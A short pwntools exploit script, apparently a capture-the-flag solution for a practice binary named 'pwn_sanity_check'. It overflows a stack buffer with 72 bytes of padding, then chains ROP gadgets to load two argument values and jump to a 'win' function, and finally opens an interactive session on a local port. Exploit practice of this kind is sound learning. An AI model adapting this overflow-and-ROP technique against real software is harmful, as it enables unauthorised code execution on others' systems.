from pwn import *

#p = process('./pwn_sanity_check')
p = remote('localhost',40004)
#pid =gdb.attach(p,gdbscript="""""")
pad = 72 * 'A'
win_addr = p64(0x0000000000400697)
ret = p64(0x0000000000400536)
pop_rdi_ret = p64(0x0000000000400813)
pop_rsi_r15_ret = p64(0x0000000000400811)

payload = pad
payload += pop_rdi_ret
payload += p64(0xdeadbeef)
payload += pop_rsi_r15_ret
payload += p64(0x1337c0de)
payload += p64(0x0)
#payload += ret
payload += win_addr


p.sendlineafter('joke\n',payload)
p.recvline()
p.interactive()
